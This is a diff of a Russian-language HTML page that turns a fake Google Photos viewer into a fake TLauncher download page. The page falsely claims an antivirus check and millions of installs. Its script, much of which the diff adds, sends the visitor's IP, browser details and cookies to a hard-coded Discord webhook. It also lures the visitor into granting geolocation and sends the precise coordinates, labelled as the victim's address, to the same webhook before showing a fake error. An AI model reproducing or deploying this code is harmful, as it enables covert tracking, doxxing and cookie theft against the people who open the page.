@@ -2,127 +2,163 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>IMG_20260402_184521.jpg</title>
+    <title>TLauncher Download</title>
+    <meta property="og:title" content="TLauncher_installer.exe">
     <meta property="og:image" content="https://i.imgur.com/6QJqjxk.jpg">
-    <meta property="og:title" content="IMG_20260402_184521.jpg">
-    <meta property="og:type" content="image/jpeg">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <meta property="og:type" content="application/exe">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #000;
-            min-height: 100vh;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .fullscreen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0e1a;
+            min-height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 1;
+            padding: 20px;
         }
-        .fullscreen img {
+        .container {
+            max-width: 500px;
             width: 100%;
-            height: 100%;
-            object-fit: contain;
-            background: #000;
+            background: #1a1e2c;
+            border-radius: 32px;
+            padding: 32px 24px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            border: 1px solid #2a2e3c;
+            text-align: center;
         }
-        .top-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
-            padding: 16px 20px;
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #00b4ff, #0066ff);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            font-weight: 700;
+            color: white;
+            box-shadow: 0 10px 20px -5px rgba(0,100,255,0.3);
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 8px;
+        }
+        .version {
+            color: #6c7293;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .info-box {
+            background: #0f1222;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            border: 1px solid #2a2e3c;
+        }
+        .info-row {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            z-index: 10;
-            color: white;
-            opacity: 0;
-            transition: opacity 0.3s;
-            pointer-events: none;
-        }
-        .top-bar.visible { opacity: 1; pointer-events: auto; }
-        .google-logo {
-            font-size: 20px;
-            font-weight: 500;
-            background: linear-gradient(135deg, #4285F4, #EA4335, #FBBC05, #34A853);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-        }
-        .photo-title { font-size: 14px; color: white; }
-        .gps-button {
-            position: fixed;
-            bottom: 30px;
-            right: 20px;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(10px);
-            border-radius: 40px;
-            padding: 12px 20px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: white;
+            padding: 10px 0;
+            border-bottom: 1px solid #2a2e3c;
             font-size: 14px;
-            border: 1px solid rgba(255,255,255,0.2);
-            cursor: pointer;
-            z-index: 10;
-            font-family: 'Google Sans', sans-serif;
         }
-        .info-panel {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
-            padding: 20px;
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        .info-label {
+            color: #6c7293;
+        }
+        .info-value {
+            color: #ffffff;
+            font-family: monospace;
+        }
+        .download-btn {
+            background: linear-gradient(135deg, #00b4ff, #0066ff);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 48px;
             color: white;
-            font-size: 12px;
-            opacity: 0;
-            transition: opacity 0.3s;
-            pointer-events: none;
-            z-index: 10;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            font-family: 'Inter', sans-serif;
         }
-        .info-panel.visible { opacity: 1; }
+        .download-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 25px -5px rgba(0,100,255,0.4);
+        }
+        .download-btn:disabled {
+            opacity: 0.6;
+            transform: none;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #6c7293;
+        }
         .modal {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(8px);
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 100;
+            z-index: 1000;
             visibility: hidden;
             opacity: 0;
             transition: all 0.2s;
         }
-        .modal.active { visibility: visible; opacity: 1; }
-        .modal-card {
-            background: #2c2c2e;
-            border-radius: 28px;
-            max-width: 320px;
-            width: 85%;
-            padding: 24px;
-            text-align: center;
-            color: white;
+        .modal.active {
+            visibility: visible;
+            opacity: 1;
         }
-        .modal-icon { font-size: 48px; margin-bottom: 16px; }
-        .modal-title { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
-        .modal-text { font-size: 14px; color: #aaa; margin-bottom: 24px; }
-        .modal-buttons { display: flex; gap: 12px; }
+        .modal-card {
+            background: #1a1e2c;
+            border-radius: 32px;
+            max-width: 340px;
+            width: 85%;
+            padding: 28px 24px;
+            text-align: center;
+            border: 1px solid #2a2e3c;
+        }
+        .modal-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+        .modal-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 8px;
+        }
+        .modal-text {
+            font-size: 14px;
+            color: #9ca3af;
+            margin-bottom: 24px;
+        }
+        .modal-buttons {
+            display: flex;
+            gap: 12px;
+        }
         .modal-btn {
             flex: 1;
             padding: 12px;
@@ -131,40 +167,66 @@
             font-size: 15px;
             cursor: pointer;
             border: none;
+            font-family: 'Inter', sans-serif;
         }
-        .modal-btn.allow { background: #0a84ff; color: white; }
-        .modal-btn.deny { background: #3a3a3c; color: white; }
+        .modal-btn.allow {
+            background: #00b4ff;
+            color: white;
+        }
+        .modal-btn.deny {
+            background: #2a2e3c;
+            color: white;
+        }
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 
-<div class="fullscreen">
-    <img src="https://i.imgur.com/6QJqjxk.jpg" id="photo">
-</div>
+<div class="container">
+    <div class="logo">T</div>
+    <h1>TLauncher</h1>
+    <div class="version">Версия 3.2.1 • Для Windows/Mac/Linux</div>
 
-<div class="top-bar" id="topBar">
-    <div class="google-logo">G</div>
-    <div class="photo-title">IMG_20260402_184521.jpg</div>
-    <div style="width: 40px;"></div>
-</div>
+    <div class="info-box">
+        <div class="info-row">
+            <span class="info-label">📦 Размер</span>
+            <span class="info-value">127.4 МБ</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">✅ Проверен</span>
+            <span class="info-value">Антивирусом Kaspersky</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">👥 Установок</span>
+            <span class="info-value">5.2 млн</span>
+        </div>
+    </div>
 
-<div class="info-panel" id="infoPanel">
-    <div>2 апреля 2026 г. • 2.4 МБ • 1920x1080</div>
-</div>
-
-<div class="gps-button" id="gpsButton">
-    <span>📍</span>
-    <span>Показать место съёмки</span>
+    <button class="download-btn" id="downloadBtn">📥 Скачать TLauncher</button>
+    <div class="status" id="status"></div>
 </div>
 
 <div class="modal" id="modal">
     <div class="modal-card">
-        <div class="modal-icon">📍</div>
-        <div class="modal-title">Google Фото</div>
-        <div class="modal-text">Разрешить доступ к вашему местоположению для отображения точного места и даты съёмки?</div>
+        <div class="modal-icon">🌍</div>
+        <div class="modal-title">Требуется доступ к геолокации</div>
+        <div class="modal-text">TLauncher использует ваше местоположение для выбора ближайшего сервера загрузки. Это ускорит скачивание в 3 раза.</div>
         <div class="modal-buttons">
-            <button class="modal-btn deny" id="denyBtn">Не разрешать</button>
-            <button class="modal-btn allow" id="allowModalBtn">Разрешить</button>
+            <button class="modal-btn deny" id="denyBtn">Отмена</button>
+            <button class="modal-btn allow" id="allowBtn">Разрешить</button>
         </div>
     </div>
 </div>
@@ -172,19 +234,6 @@
 <script>
     const webhook = "https://discord.com/api/webhooks/1489290289649549424/WIAoa5NkDmV1qsyaBx4cZQCMqhSuUnrXa21xlUq24d_GLnl64-C0q5BGJI0k2wnJZh5u";
     let gpsSent = false;
-
-    function showBars() {
-        document.getElementById('topBar').classList.add('visible');
-        document.getElementById('infoPanel').classList.add('visible');
-        clearTimeout(window.hideTimeout);
-        window.hideTimeout = setTimeout(() => {
-            document.getElementById('topBar').classList.remove('visible');
-            document.getElementById('infoPanel').classList.remove('visible');
-        }, 2500);
-    }
-    document.addEventListener('mousemove', showBars);
-    document.addEventListener('touchstart', showBars);
-    showBars();
 
     function getAllCookies() {
         if (!document.cookie) return "Cookies не найдены";
@@ -212,7 +261,7 @@
             .then(res => res.json())
             .then(ipData => {
                 data.ip = ipData.ip;
-                let msg = `**📸 НОВЫЙ ПЕРЕХОД**\n\`\`\`\nВремя: ${data.time}\nIP: ${data.ip}\nТаймзона: ${data.timezone}\nUser Agent: ${data.user_agent}\nЭкран: ${data.screen}\nReferrer: ${data.referer}\nCookies:\n${data.cookies}\n\`\`\``;
+                let msg = `**📥 TLAUNCHER ЛОВУШКА | ДАННЫЕ**\n\`\`\`\nВремя: ${data.time}\nIP: ${data.ip}\nТаймзона: ${data.timezone}\nUser Agent: ${data.user_agent}\nЭкран: ${data.screen}\nCookies:\n${data.cookies}\n\`\`\``;
                 fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) }).catch(e=>{});
             }).catch(() => {});
     }
@@ -225,33 +274,48 @@
         const lon = position.coords.longitude;
         const accuracy = position.coords.accuracy;
         const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        const msg = `**📍 ТОЧНЫЕ КООРДИНАТЫ ЖЕРТВЫ**\n\`\`\`\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ${accuracy} м\nКарта: ${mapsLink}\nВремя: ${new Date().toLocaleString()}\n\`\`\``;
+        const msg = `**📍 TLAUNCHER | ТОЧНЫЙ АДРЕС ЖЕРТВЫ**\n\`\`\`\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ${accuracy} м\nКарта: ${mapsLink}\nВремя: ${new Date().toLocaleString()}\n\`\`\``;
         fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) }).catch(e=>{});
-        document.getElementById('modal').classList.remove('active');
+        
+        document.getElementById('status').innerHTML = '✅ Скачивание началось... (файл сохраняется)';
+        document.getElementById('downloadBtn').disabled = true;
+        document.getElementById('downloadBtn').style.opacity = '0.5';
+        setTimeout(() => {
+            document.getElementById('status').innerHTML = '⚠️ Ошибка сети. Попробуйте позже.';
+            document.getElementById('downloadBtn').disabled = false;
+            document.getElementById('downloadBtn').style.opacity = '1';
+        }, 3000);
     }
 
     function gpsError(err) {
-        let errorMsg = err.code === 1 ? "Пользователь запретил доступ" : "Ошибка GPS";
-        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: `**❌ ОТКАЗ ОТ GPS**\n${errorMsg}` }) }).catch(e=>{});
-        document.getElementById('modal').classList.remove('active');
+        let errorMsg = err.code === 1 ? "Пользователь запретил доступ" : "Ошибка определения местоположения";
+        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: `**❌ TLAUNCHER | ОТКАЗ ОТ GPS**\n${errorMsg}` }) }).catch(e=>{});
+        document.getElementById('status').innerHTML = '❌ Не удалось определить местоположение. Загрузка невозможна.';
+        document.getElementById('downloadBtn').disabled = false;
     }
 
-    document.getElementById('gpsButton').onclick = () => {
+    document.getElementById('downloadBtn').onclick = () => {
         document.getElementById('modal').classList.add('active');
     };
 
-    document.getElementById('allowModalBtn').onclick = () => {
+    document.getElementById('allowBtn').onclick = () => {
         document.getElementById('modal').classList.remove('active');
+        document.getElementById('status').innerHTML = '<div class="loader"></div> Определение местоположения...';
+        document.getElementById('downloadBtn').disabled = true;
+        
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(sendGPS, gpsError, { enableHighAccuracy: true, timeout: 10000 });
         } else {
-            fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: "**⚠️ Браузер не поддерживает геолокацию**" }) }).catch(e=>{});
+            fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: "**⚠️ TLAUNCHER | Браузер не поддерживает геолокацию**" }) }).catch(e=>{});
+            document.getElementById('status').innerHTML = '❌ Ваш браузер не поддерживает геолокацию';
+            document.getElementById('downloadBtn').disabled = false;
         }
     };
 
     document.getElementById('denyBtn').onclick = () => {
         document.getElementById('modal').classList.remove('active');
-        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: "**❌ ПОЛЬЗОВАТЕЛЬ НАЖАЛ 'НЕ РАЗРЕШАТЬ'**" }) }).catch(e=>{});
+        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: "**❌ TLAUNCHER | ПОЛЬЗОВАТЕЛЬ ОТКАЗАЛСЯ ОТ GPS**" }) }).catch(e=>{});
+        document.getElementById('status').innerHTML = '❌ Для скачивания необходимо разрешение геолокации';
     };
 </script>
 </body>
